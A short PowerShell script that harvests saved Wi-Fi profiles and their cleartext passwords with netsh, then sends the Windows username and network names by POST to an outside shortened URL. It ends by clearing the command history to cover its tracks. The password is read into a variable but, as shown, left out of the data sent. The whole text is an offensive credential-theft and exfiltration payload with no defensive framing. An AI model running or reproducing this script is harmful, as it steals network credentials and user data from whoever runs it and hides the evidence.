
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

    $body = @{
	'username' = $env:username + "|" + [string]$wlan
	'content' = "Accessing"
    }
    Invoke-RestMethod -ContentType 'Application/Json' -Uri https://tinyurl.com/4fkvj22m -Method Post -Body ($body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
